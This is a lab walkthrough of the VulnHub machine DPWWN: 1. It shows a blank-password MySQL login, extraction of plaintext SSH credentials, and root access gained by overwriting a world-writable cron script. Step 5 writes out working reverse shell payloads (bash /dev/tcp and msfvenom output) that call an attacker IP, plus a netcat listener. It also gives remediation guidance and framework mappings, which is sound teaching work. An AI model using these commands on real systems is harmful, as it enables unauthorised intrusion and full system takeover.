# DPWWN: 1 — The Database Handed Us the Keys

Alright guys!! Imagine a MySQL server sitting wide open on the internet, no password, with a database literally called `ssh` containing plaintext credentials. That is DPWWN: 1 in a nutshell. You query the database, grab the credentials, SSH in, find a cron script you can overwrite, and wait for root to call back. Beginner-friendly but brutally realistic: exposed databases with blank passwords are still a top finding in enterprise assessments. Let's go! ᕕ( ᐛ )ᕗ

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | DPWWN: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/dpwwn-1,342/ |
| **Techniques** | Nmap service enumeration, MySQL unauthenticated access, plaintext credential extraction from database, SSH login, cron job abuse via writable script |
| **CVEs** | CWE-306 (Missing Authentication for Critical Function — MySQL exposed without password), CWE-732 (Incorrect Permission Assignment — world-writable cron script), CWE-522 (Insufficiently Protected Credentials — plaintext passwords in database) |
| **APT Groups** | APT41: exploits exposed database services for credential access in healthcare and finance targets; FIN7: uses writable scheduled task/cron scripts as persistence and privilege escalation mechanisms |

---

## Attack Summary

```
nmap: SSH (22), HTTP (80), MySQL (3306)
    |
    v
MySQL port 3306: connect with blank root password
    |
    v
SHOW DATABASES → database "ssh" found
    |
    v
SELECT * FROM ssh.users → mistic:testP@$$swordmistic (plaintext)
    |
    v
SSH login as mistic
    |
    v
cat /etc/crontab → logrot.sh runs as root
    |
    v
ls -la logrot.sh → world-writable
    |
    v
Overwrite logrot.sh with reverse shell payload
    |
    v
nc -lvnp 1234 → root shell on next cron execution
    |
    v
cat /root/dpwwn-01-FLAG.txt
```

---

## Methodology

1. Full port scan to identify all services
2. MySQL unauthenticated access and database enumeration
3. Credential extraction from the `ssh.users` table
4. SSH login with recovered credentials
5. Cron job enumeration and writable script identification
6. Privilege escalation by overwriting the cron script with a reverse shell

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.101

nmap -sV -sC -p- 192.168.1.101
```

Expected output:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.x
80/tcp   open  http    Apache httpd
3306/tcp open  mysql   MySQL 5.x
```

Three services. HTTP is probably a placeholder. MySQL on port 3306 is extremely interesting: a publicly exposed database almost always has authentication issues on CTF machines, and often in real environments too.

**Real-world note:** MySQL should never be exposed on a public-facing interface. The default bind address in MySQL is `0.0.0.0`, which means every interface — including the network card — unless explicitly changed to `127.0.0.1`. This is the #1 MySQL misconfiguration finding in external penetration tests.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — MySQL Unauthenticated Access

Test MySQL with a blank root password:

```bash
mysql -h 192.168.1.101 -u root -p
# Press Enter at the password prompt (blank password)
```

Access granted. No password required. This is CWE-306 in its most naked form.

```sql
SHOW DATABASES;
```

Output:

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| ssh                |
| ...                |
+--------------------+
```

The database named `ssh` is immediately suspicious. Enumerate it:

```sql
USE ssh;
SHOW TABLES;
SELECT * FROM users;
```

Result:

```
+--------+----------------------+
| user   | pass                 |
+--------+----------------------+
| mistic | testP@$$swordmistic  |
+--------+----------------------+
```

Plaintext SSH credentials. Absolutely wild. The machine literally named a database after what the credentials are for.

**Alternative:** Use `nmap` MySQL NSE scripts for automated enumeration: `nmap -p 3306 --script mysql-empty-password,mysql-databases,mysql-query 192.168.1.101`

**Real-world note:** APT41 has been documented exfiltrating SSH credentials from exposed MySQL databases in healthcare sector intrusions. The pattern of storing credentials in a database that is itself publicly accessible with no authentication represents a complete failure of defense-in-depth.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application, T1552.001 — Credentials in Files

---

## Step 3 — SSH Login as mistic

```bash
ssh mistic@192.168.1.101
# Password: testP@$$swordmistic
id
# uid=1000(mistic)
```

Shell obtained as `mistic`. Now enumerate for privilege escalation.

**MITRE ATT&CK:** T1021.004 — Remote Services: SSH

---

## Step 4 — Cron Job Enumeration

Check the home directory and look for interesting files:

```bash
ls -la ~
cat logrot.sh
```

The `logrot.sh` script is a log rotation helper. Check if it runs as root:

```bash
cat /etc/crontab
```

Output (relevant line):

```
* * * * * root /home/mistic/logrot.sh
```

The script runs every minute as root. Now check its permissions:

```bash
ls -la ~/logrot.sh
# -rwxrwxrwx 1 mistic mistic  logrot.sh
```

World-writable. That is CWE-732 and an instant privilege escalation. The script is owned by `mistic`, runs as root, and any user on the system can overwrite it.

**Real-world note:** World-writable cron scripts executed by root are consistently one of the highest-severity findings in Linux privilege escalation assessments. The root cause is almost always a developer shortcut during setup ("just chmod 777 it for now") that never got reversed.

**MITRE ATT&CK:** T1053.003 — Scheduled Task: Cron, T1222 — File and Directory Permissions Modification

---

## Step 5 — Cron Script Overwrite and Root Shell

Generate a reverse shell payload:

```bash
# Direct bash reverse shell (simpler than msfvenom for this scenario):
echo 'bash -i >& /dev/tcp/192.168.1.106/1234 0>&1' > ~/logrot.sh
```

Alternatively, use msfvenom for a more stable shell:

```bash
# On attacker:
msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.106 lport=1234 R
# Output: 0<&74-;exec 74<>/dev/tcp/192.168.1.106/1234;sh <&74 >&74 2>&74

# On target:
echo '0<&74-;exec 74<>/dev/tcp/192.168.1.106/1234;sh <&74 >&74 2>&74' > ~/logrot.sh
cat ~/logrot.sh  # verify it was written correctly
```

Start the listener:

```bash
nc -lvnp 1234
```

Wait up to 60 seconds for the cron job to trigger. A root shell arrives.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

python3 -c 'import pty; pty.spawn("/bin/bash")'
cat /root/dpwwn-01-FLAG.txt
```

Flag captured. gg!

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used/Cracked |
|---|---|---|---|
| SSH credential | `mistic:testP@$$swordmistic` | `ssh.users` table in MySQL | SSH login as mistic |
| Root flag | Contents of `/root/dpwwn-01-FLAG.txt` | After cron script overwrite | Final flag |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | MySQL exposed on port 3306 with blank root password | MySQL with no root password or network binding to 0.0.0.0 is one of the top findings in external assessments | Bind MySQL to localhost: `bind-address = 127.0.0.1` in `my.cnf`; set a strong root password |
| 2 | Plaintext SSH credentials stored in MySQL database | Storing credentials in plaintext in any database is CWE-522 and invalidates the purpose of authentication | Never store plaintext credentials; use bcrypt/scrypt hashing; use a secrets manager for service credentials |
| 3 | World-writable cron script executed as root | Any file executed by a privileged process that is writable by an unprivileged user is an instant privilege escalation | Cron scripts must be owned by root and mode 700 or 750; never world-writable |
| 4 | Cron running every minute provides rapid exploitation | High-frequency cron jobs minimize the wait time for an attacker after planting a payload | Audit cron frequency; use systemd timers with proper unit file permissions instead of cron for privileged tasks |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Discovery | Discovery | System Information Discovery | T1082 |
| Persistence | Persistence | Scheduled Task: Cron | T1053.003 |
| Privilege Escalation | Privilege Escalation | Scheduled Task Abuse (world-writable script) | T1053.003 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |

---

## Remediation and Containment

### Technical Fixes

1. **Bind MySQL to localhost only** — add `bind-address = 127.0.0.1` to `/etc/mysql/mysql.conf.d/mysqld.cnf` and restart MySQL
2. **Set MySQL root password** — `ALTER USER 'root'@'%' IDENTIFIED BY 'StrongRandomPassword123!'; FLUSH PRIVILEGES;`
3. **Remove the `ssh` database** — it exists only to store plaintext credentials and must be dropped
4. **Hash credentials if database storage is needed** — use bcrypt or Argon2; never store plaintext passwords in any database
5. **Fix cron script permissions** — `chown root:root /home/mistic/logrot.sh && chmod 700 /home/mistic/logrot.sh`
6. **Review all cron jobs** — `grep -r '' /etc/cron* /var/spool/cron`; ensure every script executed by root is owned by root and not writable by others
7. **Implement MySQL firewall rules** — if MySQL must be accessible remotely, restrict to known IPs: `iptables -A INPUT -p tcp --dport 3306 ! -s <trusted_ip> -j DROP`

### If You Find This in Your Environment

- Immediately change the MySQL root password and bind to localhost
- Audit all tables in the MySQL instance for stored credentials and rotate them
- Check crontab and all cron directories for world-writable scripts
- Review `/var/log/auth.log` for unexpected SSH logins as `mistic`

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all database services and their network exposure |
| Protect | Access Control | Bind MySQL to localhost; set strong root password; restrict SSH access |
| Protect | Data Security | Never store plaintext credentials; implement database credential hashing |
| Detect | Anomalies and Events | Alert on MySQL connections from non-localhost addresses; monitor cron script modifications |
| Respond | Response Planning | Change MySQL root password; rotate mistic's SSH credentials; fix cron script permissions |
| Recover | Recovery Planning | Review all accounts for unauthorized access; verify no persistence mechanisms remain |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Bind MySQL to localhost; restrict network access to database |
| AC-6 | Least Privilege | Cron scripts must be owned by root and not writable by unprivileged users |
| IA-5 | Authenticator Management | Replace plaintext credential storage with hashed values; set MySQL root password |
| CM-7 | Least Functionality | Disable remote MySQL access unless specifically required |
| AU-2 | Event Logging | Log MySQL authentication attempts; alert on failed and successful remote logins |

### CISA KEV

Exposed MySQL instances with blank or weak root passwords are documented in multiple CISA Advisories (AA20-049A, AA22-249A) as initial access vectors used by ransomware operators and APT groups. Organizations should treat any database service exposed to untrusted networks as a critical vulnerability.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |
| Identity and Access Management (IAM) | Manage Authentication | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (bind MySQL to localhost; disable blank root password)
- **D3-OAM** — Operating System Administrative Management (restrict cron script permissions; audit scheduled tasks)
- **D3-NTF** — Network Traffic Filtering (firewall rule blocking external access to port 3306)

---

## Final Thoughts

DPWWN: 1 is as realistic as CTF machines get. Exposed MySQL instances with blank passwords are not a theoretical concern: they appear in external assessments of real organizations with surprising regularity. The combination of "database exposed to the internet" and "credentials stored in that same database" is a complete security collapse that an attacker can exploit in under two minutes.

The cron overwrite is a classic and clean privilege escalation: world-writable scripts run by root exist in the wild, usually as leftovers from sloppy initial setup. This machine teaches you to check `/etc/crontab` and script permissions as standard post-exploitation procedure.

Two clicks from the internet to root. That is why default configurations are dangerous.

Thanks guys!! (❍ᴥ❍ʋ)
